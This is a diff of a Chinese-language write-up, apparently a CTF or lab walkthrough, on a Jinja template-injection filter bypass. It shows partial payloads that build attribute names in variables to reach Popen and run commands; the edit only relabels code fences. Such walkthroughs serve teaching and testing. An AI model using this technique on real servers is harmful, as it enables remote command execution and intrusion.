@@ -1974,7 +1974,7 @@ L74-75 if 可以看出開發者已經考慮到了 SSTI 過濾 `.__` 字元
 > 等價於 `object.attribute_name`
 
 利用這個 feature 建立 SSTI 所需的 attributes:
-```py
+```jinja
 {% set string = "ssti" %}
 {% set class = "__class__" %}
 {% set mro = "__mro__" %}
@@ -1989,7 +1989,7 @@ L74-75 if 可以看出開發者已經考慮到了 SSTI 過濾 `.__` 字元
 🎯：取得一個可以執行 OS command 的 class
 ### Gaining Remote Command Execution
 1. 拿 mro
-```py
+```jinja
 {% set string = "ssti" %}
 {% set class = "__class__" %}
 {% set mro = "__mro__" %}
@@ -2000,7 +2000,7 @@ L74-75 if 可以看出開發者已經考慮到了 SSTI 過濾 `.__` 字元
 ![image](https://hackmd.io/_uploads/ryCA7S8nZg.png)
 
 2. 取 object class
-```py
+```jinja
 {% set string = "ssti" %}
 {% set class = "__class__" %}
 {% set mro = "__mro__" %}
@@ -2013,7 +2013,7 @@ L74-75 if 可以看出開發者已經考慮到了 SSTI 過濾 `.__` 字元
 
 Jinja 語法不支援在 filter 後使用`[`字元\
 將 mro 屬性的回應儲成變量
-```py
+```jinja
 {% set string = "ssti" %}
 {% set class = "__class__" %}
 {% set mro = "__mro__" %}
@@ -2026,7 +2026,7 @@ Jinja 語法不支援在 filter 後使用`[`字元\
 
 3. 拿 subclasses   
 需要使用`__subclasses__`方法列出所有子類別。存取屬性後，還需要用 `()` 來執行 method
-```py
+```jinja
 {% set string = "ssti" %}
 {% set class = "__class__" %}
 {% set mro = "__mro__" %}
@@ -2042,7 +2042,7 @@ Jinja 語法不支援在 filter 後使用`[`字元\
 > L421 Popen
 
 建構 payload
-```py
+```jinja
 {% set string = "ssti" %}
 {% set class = "__class__" %}
 {% set mro = "__mro__" %}
@@ -2057,7 +2057,7 @@ Jinja 語法不支援在 filter 後使用`[`字元\
 ### Gaining Remote Command Execution
 要成功執行Popen 需要傳入一個 list 包含命令和參數\
 嘗試建立一個位於/tmp/ 目錄下的檔案
-```py
+```jinja
 {% set string = "ssti" %}
 {% set class = "__class__" %}
 {% set mro = "__mro__" %}
